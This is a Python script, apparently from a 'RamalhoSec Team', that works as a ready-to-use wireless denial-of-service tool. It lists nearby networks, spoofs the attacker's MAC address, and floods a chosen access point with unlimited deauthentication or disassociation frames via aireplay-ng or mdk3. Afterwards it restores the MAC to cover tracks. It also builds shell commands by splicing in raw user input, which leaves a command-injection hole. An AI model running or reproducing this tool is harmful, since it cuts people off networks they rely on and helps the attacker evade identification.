#!/usr/bin/env python
import os
import sys

   
def cls():
   logo = ("""
   ____________
  |____________|_
   ||--------|| | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   ||-__     || | @@ HA ha ha you is a dead AP! @@
   ||   --__ || | @@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@
   ||      --|| |     @@@
   ||        || O\    __                            Lite Wirelles Down ver0.1b
   ||        ||  \\  (..)
   ||        ||   \\_|  |_             !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   ||        ||    \  \/  )           !!      Created by RamalhoSec Team | 20/11/2018          !!
   ||        ||     :    :|           !!      Donate  btc 3DppKRbA9Um3z4wnmVtkqnETnvwsip7WkC   !!    
   ||        ||     :    :|           !!      Contact https://github.com/RamalhoSec            !!
   ||        ||     :====:O           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   ||        ||     (    )            !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!                
   ||__@@@@__||     | `' |            !!      Normal use: litewifidown.py  Quiet: -q           !!          
   || @|AP|@ ||     | || |            !!      Direct use:                                      !! 
   ||O@`=='@O||     | || |            !!            --a      Attack with the aireplay-ng       !! 
   ||_@\/\/@_||     |_||_|            !!            --m      Attack with the mdk3              !! 
 ----------------   '_'`_`            !!      Options required:                                !! 
/________________\----------\         !!             -i      Set Interface name (-air)(-mdk)   !! 
|   GUILLOTINE   |-----------|        !!             -b      Set target BSSID for (-air)       !! 
|  OF WIRELESS NETWORKS      |        !!             -c      Set channel for monitor (-air)    !!  
|____________________________|        !!             -e      Set target ESSID for (-mdk)       !!   
                                      !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                                      """)
   os.system('clear')
   print(logo)
   print("")
 



def start():
   if(sys.argv[1] == "--help"):#Help page
      cls()
      print("# Aireplay quiet example: python litewifidown.py --a -i IFACE -b BSSID")
      print("# Mdk3 quiet example: python litewifidown.py --m -i IFACE -e ESSID")
   if(sys.argv[1] == "--a"):#aireplay attack
      cls()
      print("Listing Wireless cards: ")
      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
      os.system('cat -n monitor.rmo')
      monitor = raw_input("Select you wirelles card fo monitor mode: ")
      print("")
   
      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
      print("Changing the MAC")
      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
      os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
      print("")
   
      
      print("")
      print("Listing avaliable wireless network for attack: ")
      os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")
      target = raw_input("Select one ESSID for start the attack: ")
      os.system("cat target-01.csv | grep '"+target+"' > target.rmo")
      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $20}' | sed 's/,//g' > tessid.rmo")
      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $1}' | sed 's/,//g' > tbssid.rmo")
      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's/,//g' > tchannel.rmo")
      print("")
      
      print("############################# Aireplay attack! ###################################")
      os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
      os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
      os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
      os.system('rm *.rmo && rm target*')
      
   if(sys.argv[1] == "--m"):#mdk3 attack
      cls()
      print("Listing Wireless cards: ")
      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
      os.system('cat -n monitor.rmo')
      monitor = raw_input("Select you wirelles card fo monitor mode: ")
      print("")
   
      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
      print("Changing the MAC")
      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
      os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
      print("")
   
      
      print("")
      print("Listing avaliable wireless network for attack: ")
      os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")
      target = raw_input("Select one ESSID for start the attack: ")
      os.system("cat target-01.csv | grep '"+target+"' > target.rmo")
      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $20}' | sed 's/,//g' > tessid.rmo")
      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $1}' | sed 's/,//g' > tbssid.rmo")
      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's/,//g' > tchannel.rmo")
      print("")
      
      print("############################# mdk3 attack! #######################################")
      os.system("monitor=`cat monitor.rmo` && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
      os.system("monitor=`cat monitor.rmo` && macchanger -p $monitor")
      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
      os.system('rm *.rmo && rm target*')
      
      
   if(sys.argv[1] == "-q"):#Quiet attack
      if(sys.argv[2] == "--a"):
         mode="aireplay-ng "
         print("############################# Quiet: "+mode+" attack #############################")
         print("Changing the MAC")
         os.system("ifconfig "+str(sys.argv[4])+" down")
         os.system("macchanger -r "+str(sys.argv[4])+"")
         os.system("ifconfig "+str(sys.argv[4])+" up")
         #os.system("airmon-ng start "+str(sys.argv[5])+" "+str(sys.argv[8])+"")
         os.system(""+mode+"-0 0 -a "+str(sys.argv[6])+" "+str(sys.argv[4])+"")
         #os.system("airmon-ng stop "+str(sys.argv[5])+"mon")
         os.system("ifconfig "+str(sys.argv[4])+" down")
         os.system("macchanger -p "+str(sys.argv[4])+"")
         os.system("ifconfig "+str(sys.argv[4])+" up")
         
      if(sys.argv[2] == "--m"):
         mode="mdk3 "
         print("############################# Quiet: "+mode+" attack #############################")
         print("Changing the MAC")
         os.system("ifconfig "+str(sys.argv[4])+" down")
         os.system("macchanger -r "+str(sys.argv[4])+"")
         os.system("ifconfig "+str(sys.argv[4])+" up")
         os.system(""+mode+str(sys.argv[4])+" d -n"+str(sys.argv[6])+"")
         os.system("ifconfig "+str(sys.argv[4])+" down")
         os.system("macchanger -p "+str(sys.argv[4])+"")
         os.system("ifconfig "+str(sys.argv[4])+" up")
      
      
try:
   sys.argv[1]
except Exception:
   cls()
   
   print("Check dependencies: ")
   print("")
   os.system('test /usr/bin/python  && echo "[+] Python ok" || apt-get -y install python')
   os.system('test /usr/bin/mdk3 && echo "[+] Mdk3 ok" || apt-get -y install mdk3')
   os.system('test /usr/bin/aircrack-ng && echo "[+] Aircrack-ng ok" || apt-get -y install aircrack-ng')
   os.system('test /usr/bin/macchanger && echo "[+] MacChanger ok" || apt-get -y install macchanger')
   print("")
   
   print("Listing Wireless cards: ")
   os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
   os.system('cat -n monitor.rmo')
   monitor = raw_input("Select you wirelles card fo monitor mode: ")
   print("")
   
   os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
   print("Changing the MAC")
   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
   os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
   print("")
   
   
   print("")
   print("List of avaliable attack mod: ")
   print("[1] Mdk3 Deauth / Disassociation")
   print("[2] Aireplay-ng Deauth")
   attack = raw_input("Select one mod fo the attack: ")
   print("")

   print("Listing avaliable wireless network for attack: ")
   os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")

   target = raw_input("Select one ESSID for start the attack: ")
   os.system("cat target-01.csv | grep '"+target+"' > target.rmo")
   os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $20}' | sed 's/,//g' > tessid.rmo")
   os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $1}' | sed 's/,//g' > tbssid.rmo")
   os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's/,//g' > tchannel.rmo")
   print("")

   if attack == '1':
      print("############################# mdk3 attack! #######################################")
      os.system("monitor=`cat monitor.rmo` && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
   else:
      print("############################# Aireplay attack! ###################################")
      os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
      os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
      os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
   
   
   
   
   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
   os.system("monitor=`cat monitor.rmo` && macchanger -p $monitor")
   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
   print("")
   os.system('rm *.rmo && rm target*')
else:
   start()
